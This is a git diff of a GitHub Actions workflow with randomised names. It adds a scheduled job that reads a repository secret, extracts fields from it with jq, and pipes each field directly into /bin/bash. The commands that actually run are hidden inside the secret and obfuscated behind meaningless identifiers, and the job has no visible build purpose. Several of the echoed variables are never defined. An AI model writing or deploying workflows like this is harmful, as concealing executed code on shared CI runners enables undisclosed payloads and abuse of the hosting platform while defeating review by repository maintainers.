@@ -1,22 +1,22 @@
 name: lingnanren4678
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 2/6 * * *'
-
-jobs:  # 611
+    - cron: '27 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: lingnanren4678
         env:
-          rehbg2: ${{ secrets.rehbg2 }}
+          md74963: ${{ secrets.md74963 }}
         run: |
-          echo $rehbg2 | jq -r .p83235 | /bin/bash
-          echo $v93 | jq -r .kdm977 | /bin/bash
-          echo $h46117 | jq -r .anj57 | /bin/bash
-          echo $jf359 | jq -r .d0007 | /bin/bash
-          echo $kx0330 | jq -r .xlzky333 | /bin/bash
+          echo $md74963 | jq -r .zd99751 | /bin/bash
+          echo $k9 | jq -r .kybuj796 | /bin/bash
+          echo $gqsqt39 | jq -r .ohxln1886 | /bin/bash
+          echo $i5 | jq -r .cr3091 | /bin/bash
+          echo $kue4493 | jq -r .irjab523 | /bin/bash
+          echo $b54220 | jq -r .qpsi524 | /bin/bash
+          echo $utj24 | jq -r .qlps2227 | /bin/bash
 
